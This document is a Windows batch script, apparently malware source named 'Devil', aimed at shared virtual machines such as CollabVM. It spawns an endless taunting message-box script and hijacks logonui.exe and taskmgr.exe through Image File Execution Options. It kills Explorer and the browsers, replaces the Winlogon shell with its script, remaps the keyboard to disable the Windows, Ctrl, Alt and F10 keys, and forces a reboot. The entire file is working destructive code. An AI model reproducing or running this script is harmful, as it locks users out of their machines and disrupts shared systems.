@echo off
::Github link
::https://github.com/The-Joker-Official/Devil
IF "%~1"=="" GOTO auto
IF "%~1"=="collabvm" GOTO collabvm
IF "%~1"=="collab" GOTO collabvm
IF "%~1"=="cvm" GOTO collabvm
IF "%~1"=="c" GOTO collabvm
IF "%~1"=="virusfarm" GOTO virusfarm
IF "%~1"=="virus" GOTO virusfarm
IF "%~1"=="v" GOTO virusfarm
:auto
title Loading...
if exist C:\docume~1 goto virusfarm
if not exist C:\docume~1 goto auto2
:auto2
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "Virus Farm Loader"
if %errorlevel%==0 goto virusfarm
if %errorlevel%==1 goto collabvm
:virusfarm
echo For i = 0 to 999999 > "\Devil.vbs"
echo x=msgbox("Have you ever danced with the devil under the weak light of the moon?" ^& vbNewLine ^& vbNewLine ^& "Pray for your disk!" ^& vbNewLine ^& vbNewLine ^& "     - The_Joker", 2+64, "Devil") >> "\Devil.vbs"
echo Next >> "\Devil.vbs"
start "" "%systemroot%\System32\wscript.exe" "\Devil.vbs"
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\logonui.exe" /v Debugger /d \
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /d \
taskkill /f /im explorer.exe
taskkill /f /im chrome.exe
taskkill /f /im eevee.exe
taskkill /f /im techturd.exe
taskkill /f /im firefox.exe
taskkill /f /im iexplore.exe
taskkill /f /im hh.exe
taskkill /f /im everything.exe
exit
:collabvm
echo For i = 0 to 999999 > "%userprofile%\Music\Devil.vbs"
echo x=msgbox("Have you ever danced with the devil under the weak light of the moon?" ^& vbNewLine ^& vbNewLine ^& "Pray for your disk!" ^& vbNewLine ^& vbNewLine ^& "     - The_Joker", 2+64, "Devil") >> "%userprofile%\Music\Devil.vbs"
echo Next >> "%userprofile%\Music\Devil.vbs"
echo Windows Registry Editor Version 5.00 > "%userprofile%\Music\Devil.reg"
echo. >> "%userprofile%\Music\Devil.reg"
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout] >> "%userprofile%\Music\Devil.reg"
echo "Scancode Map"=hex:00,00,00,00,00,00,00,00,09,00,00,00,00,00,5b,e0,00,00,5c,e0,00,00,5d,e0,00,00,44,00,00,00,1d,00,00,00,38,00,00,00,1d,e0,00,00,38,e0,00,00,00,00 >> "%userprofile%\Music\Devil.reg"
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "%systemroot%\System32\wscript.exe \"%userprofile%\Music\Devil.vbs\"" /f
reg import "%userprofile%\Music\Devil.reg"
wmic os where primary='true' reboot
shutdown -f -r -t 0
